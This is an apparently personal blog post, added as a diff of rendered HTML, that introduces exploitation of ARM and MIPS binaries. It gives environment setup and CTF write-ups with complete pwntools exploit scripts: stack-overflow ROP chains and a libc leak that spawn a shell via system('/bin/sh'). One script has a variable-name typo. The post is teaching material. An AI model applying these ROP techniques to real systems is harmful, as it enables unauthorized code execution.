@@ -1,0 +1,213 @@
+
+<!DOCTYPE html>
+<html lang="default" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ARM &amp; MIPS PWN Intro - TyeYeah&#39;s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="TyeYeah, CS,"> 
+    <meta name="description" content="blog on Hexo,This paragraph is to pwn ARM and MIPS binaries, with some examples. 
+Environment SetupBasically bin,"> 
+    <meta name="author" content="TyeYeah"> 
+    <link rel="alternative" href="atom.xml" title="TyeYeah&#39;s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    <link rel="stylesheet" href="/css/diaspora.css">
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">TyeYeah&#39;s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="../../../.."></a>
+    <div title="Play/Stop" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ARM & MIPS PWN Intro</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="QR Code" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">ARM & MIPS PWN Intro</h1>
+        <div class="stuff">
+            <span>January 10, 2021</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/arm/">arm</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/linux/">linux</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/mips/">mips</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/pwn/">pwn</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/qemu/">qemu</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/rop/">rop</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>This paragraph is to pwn <code>ARM</code> and <code>MIPS</code> binaries, with some examples. </p>
+<h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p>Basically binaries are executed by <code>QEMU</code>, so some operations in <a href="http://localhost:4000/2020/01/11/2020-01-11-QEMU-Intro-and-Network-Configuration/" target="_blank" rel="noopener">QEMU Intro and Network Configuration</a> are needed.</p>
+<p>Add another one. The tool <a href="https://github.com/nongiach/arm_now" target="_blank" rel="noopener">arm_now</a> on github is wrapped to build the environment.</p>
+<h3 id="Install-Shared-Library"><a href="#Install-Shared-Library" class="headerlink" title="Install Shared Library"></a>Install Shared Library</h3><p>We can search by<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt search <span class="string">"libc6-"</span> | grep <span class="string">"&#123;ARCH&#125;"</span> <span class="comment"># `ARCH` can be arm, mips...</span></span><br></pre></td></tr></table></figure></p>
+<p>What we need are packages like <code>libc6-{ARCH}-cross</code>. </p>
+<p>As mentioned in <a href="/2020/01/11/2020-01-11-QEMU-Intro-and-Network-Configuration/">QEMU Intro and Network Configuration</a> before, the packages like <code>gcc-{ARCH}-linux-gnuxxx</code> also provides shared libraries.</p>
+<p>All above libs are stored as <code>/usr/{ARCH}-linux-gnuxxx</code>.</p>
+<h3 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h3><p>Here I mean IDA. We need plugins for MIPS. The <a href="https://github.com/devttys0/ida/tree/master/plugins/mipsrop" target="_blank" rel="noopener">MIPSROP</a> only supports IDA 6.7 and lower versions, because API changed in IDA, but there’s a researcher wrote <a href="https://github.com/tacnetsol/ida/tree/master/plugins/mipsrop" target="_blank" rel="noopener">this new one</a>.</p>
+<p>Disassembler plugin we use <a href="https://github.com/avast/retdec-idaplugin" target="_blank" rel="noopener">Retdec</a> for IDA, <a href="https://github.com/pnfsoftware/PleaseROP" target="_blank" rel="noopener">Please ROP</a> for <a href="https://www.pnfsoftware.com/jeb2/mips" target="_blank" rel="noopener">jeb2</a>, and <a href="https://binary.ninja/" target="_blank" rel="noopener">Binary Ninja</a>. </p>
+<p>As for ARM, Hex-Rays Decompiler plugin supports ARM, even MIPS now. So IDA Pro 7.5 can disassemble both ARM and MIPS now.</p>
+<h3 id="Dynamic-Analysis"><a href="#Dynamic-Analysis" class="headerlink" title="Dynamic Analysis"></a>Dynamic Analysis</h3><p>The <code>gdb</code> is what we need.<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt install gdb-multiarch <span class="comment"># same usage as gdb</span></span><br></pre></td></tr></table></figure></p>
+<p>With shared library installed, we can assign them to program by <code>-L</code> like<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-mipsel -L /usr/mipsel-linux-gnu/ ./program</span><br></pre></td></tr></table></figure></p>
+<p>Use <code>-g</code> to open ports<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu/ ./add</span><br></pre></td></tr></table></figure></p>
+<p>Then in <code>gdb-multiarch</code> (with <a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">pwndbg</a>), set architecture and connect<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture mips </span><br><span class="line">pwndbg&gt; target remote localhost:1234</span><br></pre></td></tr></table></figure></p>
+<p>This part is also included in <a href="/2020/01/11/2020-01-11-QEMU-Intro-and-Network-Configuration/#Debug-Programs"><code>Debug Programs</code> part of QEMU Intro and Network Configuration</a>.</p>
+<h2 id="CTF-Examples"><a href="#CTF-Examples" class="headerlink" title="CTF Examples"></a>CTF Examples</h2><p>Here gives some preliminary multi-arch ctf challenges</p>
+<h3 id="Jarvis-oj-typo-ARM"><a href="#Jarvis-oj-typo-ARM" class="headerlink" title="Jarvis oj - typo - ARM"></a>Jarvis oj - typo - ARM</h3><p>Attachment: <a href="/filehost/ampi/typo">typo</a><br>Check the file first (arm-32-little)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file typo</span><br><span class="line">typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped</span><br><span class="line">$ checksec typo</span><br><span class="line">[*] &apos;/root/typo&apos;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure></p>
+<p>It is a static linked armel-32bit-program. </p>
+<p>When testing we find a long string overflows the <code>program</code>. Then we calculate the padding by using <code>qemu</code> and <code>cyclic</code>.</p>
+<p>But the code is obfuscated, we have trouble figuring out the main logic, while we find <code>/bin/sh</code> at <code>.rodata:0006C384</code>. And according to the cross reference of it,we can find <code>sub_10BA8 (0x10BA8)</code> (someone find <code>sub_110B4 (0x110B4)</code>) which turns out to be <code>system()</code>.</p>
+<p>Then we need a gadget to control <code>$r0</code> and find <code>0x00020904 : pop {r0, r4, pc}</code> using <code>ROPgadget</code>. So we build the stack<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+------------+</span><br><span class="line">|            |</span><br><span class="line">|   padding  |</span><br><span class="line">|            |</span><br><span class="line">|            |</span><br><span class="line">+------------+</span><br><span class="line">| gadget_addr| &lt;- 0x20904</span><br><span class="line">+------------+</span><br><span class="line">| binsh_addr | &lt;- 0x6C384</span><br><span class="line">+------------+</span><br><span class="line">| junk_data  |</span><br><span class="line">+------------+</span><br><span class="line">| system_addr| &lt;- 0x10BA8 # 0x110B4</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure></p>
+<p>Exploit<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">'typo'</span></span><br><span class="line">context(binary = filename, log_level = <span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">sh = process(filename)</span><br><span class="line"><span class="comment">#sh = remote('ip',port)</span></span><br><span class="line">sh.sendafter(<span class="string">"quit\n"</span>,<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">112</span></span><br><span class="line">bin_sh_str = <span class="number">0x6c384</span></span><br><span class="line">system_addr = <span class="number">0x10BA8</span> <span class="comment"># 0x110B4</span></span><br><span class="line">pop_04pc = <span class="number">0x20904</span>   <span class="comment"># 0x00020904 : pop &#123;r0, r4, pc&#125;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*padding+p32(pop_04c)+p32(bin_sh_str)+p32(<span class="number">0xdeadbeef</span>)+p32(system_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">"\n"</span>,payload) </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<h3 id="Codegate2018-melong-ARM"><a href="#Codegate2018-melong-ARM" class="headerlink" title="Codegate2018 - melong - ARM"></a>Codegate2018 - melong - ARM</h3><p>Attachment: <a href="/filehost/ampi/melong">melong</a><br>Check file infomation (still arm)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file melong</span><br><span class="line">melong: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=2c55e75a072020303e7c802d32a5b82432f329e9, not stripped</span><br><span class="line">$ checksec melong</span><br><span class="line">[*] &apos;/root/melong&apos;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure></p>
+<p>After reading the pseudocode we can find that in <code>write_diary()</code>, we can give the <code>read()</code> a large size to write to stack and achieve an overflow in <code>main()</code> function frame.</p>
+<p>But before that we have to enter <code>PT()</code> to set size. It has to be negative to pass a comparision statement, and the negative value is regarded as a fairly large unsigned integer.</p>
+<p>After that we enter <code>write_diary()</code> to do <code>rop</code>: first leak <code>libc</code> address, then control it to execute <code>system(&quot;/bin/sh</code>“). </p>
+<p>The next challenge is to go back to <code>main()</code>. The <code>rop</code> in <code>ARM</code> is different from <code>x86</code> because it has no <code>ret</code> instruction. So hijacking program flow is to control <code>$pc</code>.</p>
+<p>We cannot control the program flow just using <code>rop</code> gadgets we give, the only way is to follow the program running and find some <code>pop $regs</code> to control regs (especially <code>$pc</code>). </p>
+<p>Brute forcing can be used to guess how many paddings we need to loop back to main (using <code>cyclic</code> or so, same as how we determine offset in stack overflow), another more preliminary method is to debug step by step and find the significant. gadget: <code>&lt;puts+400&gt;:    pop    {r4, r5, r6, r7, r8, r9, r10, pc}</code>.</p>
+<p>Exploit<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">'melong'</span></span><br><span class="line">libcpath = <span class="string">'/usr/arm-linux-gnueabi/lib/libc.so.6'</span></span><br><span class="line">context(binary = filename, log_level = <span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libcpath)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    sh = remote(<span class="string">"localhost"</span>, <span class="string">"port"</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"g"</span>:</span><br><span class="line">    sh = process([<span class="string">"qemu-arm"</span>, <span class="string">"-g"</span>, <span class="string">"12345"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabi/"</span>, <span class="string">"./melong"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process([<span class="string">"qemu-arm"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabi/"</span>, <span class="string">"./melong"</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = remote('ip',port)</span></span><br><span class="line">sh.sendafter(<span class="string">"Type the number:"</span>,<span class="string">"1\n1.8\n80\n"</span>)    <span class="comment"># check bmi</span></span><br><span class="line">sh.sendafter(<span class="string">"Type the number:"</span>,<span class="string">"3\n-123\n"</span>)       <span class="comment"># personal training</span></span><br><span class="line">pad = <span class="number">0x54</span></span><br><span class="line">pop_0pc = <span class="number">0x00011bbc</span> <span class="comment"># 0x00011bbc : pop &#123;r0, pc&#125;</span></span><br><span class="line">leak = <span class="string">'a'</span>*pad + p32(pop_0pc) + p32(elf.got[<span class="string">'puts'</span>]) + p32(elf.plt[<span class="string">'puts'</span>])</span><br><span class="line"></span><br><span class="line">leak += flat(elf.sym[<span class="string">'main'</span>])*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">"Type the number:"</span>,<span class="string">"4\n"</span>+leak)        <span class="comment"># write_diary</span></span><br><span class="line">sh.sendline(<span class="string">"6"</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"See you again :)\n"</span>)</span><br><span class="line">print(<span class="string">"==============================================================================="</span>)</span><br><span class="line">raw_puts = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc.address = raw_puts - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">success(<span class="string">"libc.address -&gt; &#123;:#x&#125;"</span>.format(libc.address))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">"Type the number:"</span>,<span class="string">"1\n1.8\n80\n"</span>)    <span class="comment"># check bmi</span></span><br><span class="line">sh.sendafter(<span class="string">"Type the number:"</span>,<span class="string">"3\n-123\n"</span>)       <span class="comment"># personal training</span></span><br><span class="line">payload = <span class="string">'a'</span>*pad + p32(pop_0pc) + p32(next(libc.search(<span class="string">"/bin/sh"</span>))) + p32(libc.sym[<span class="string">'system'</span>])</span><br><span class="line">sh.sendafter(<span class="string">"Type the number:"</span>,<span class="string">"4\n"</span>+payload)        <span class="comment"># write_diary</span></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">"6"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<h3 id="Shanghai2018-baby-arm-aarch64"><a href="#Shanghai2018-baby-arm-aarch64" class="headerlink" title="Shanghai2018 - baby_arm - aarch64"></a>Shanghai2018 - baby_arm - aarch64</h3><p>Attachment: <a href="/filehost/ampi/baby_arm">baby_arm</a><br>Still check the file (aarch64 aka. arm64)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file baby_arm</span><br><span class="line">baby_arm: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped</span><br><span class="line">$ checksec baby_arm</span><br><span class="line">[*] &apos;/root/baby_arm&apos;</span><br><span class="line">    Arch:     aarch64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
+<p>Updating…</p>
+<h3 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h3><h3 id="Updating…"><a href="#Updating…" class="headerlink" title="Updating…"></a>Updating…</h3>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src>
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.hhtjim.com/163/514216257.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://link.hhtjim.com/163/514213582.mp3"></li>
+                        
+                    
+                        
+                            <li title="2" data-url="https://link.hhtjim.com/163/514216237.mp3"></li>
+                        
+                    
+                        
+                            <li title="3" data-url="https://link.hhtjim.com/163/36664350.mp3"></li>
+                        
+                    
+                        
+                            <li title="4" data-url="https://link.hhtjim.com/163/401722197.mp3"></li>
+                        
+                    
+                        
+                            <li title="5" data-url="https://link.hhtjim.com/163/34228815.mp3"></li>
+                        
+                    
+                        
+                            <li title="6" data-url="https://link.hhtjim.com/163/401723178.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-enable="false" data-ae="false" data-ci data-cs data-r data-o data-a data-d="false">View Comments</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment-Setup"><span class="toc-number">1.</span> <span class="toc-text">Environment Setup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Install-Shared-Library"><span class="toc-number">1.1.</span> <span class="toc-text">Install Shared Library</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Static-Analysis"><span class="toc-number">1.2.</span> <span class="toc-text">Static Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dynamic-Analysis"><span class="toc-number">1.3.</span> <span class="toc-text">Dynamic Analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF-Examples"><span class="toc-number">2.</span> <span class="toc-text">CTF Examples</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jarvis-oj-typo-ARM"><span class="toc-number">2.1.</span> <span class="toc-text">Jarvis oj - typo - ARM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Codegate2018-melong-ARM"><span class="toc-number">2.2.</span> <span class="toc-text">Codegate2018 - melong - ARM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shanghai2018-baby-arm-aarch64"><span class="toc-number">2.3.</span> <span class="toc-text">Shanghai2018 - baby_arm - aarch64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIPS"><span class="toc-number">2.4.</span> <span class="toc-text">MIPS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Updating…"><span class="toc-number">2.5.</span> <span class="toc-text">Updating…</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
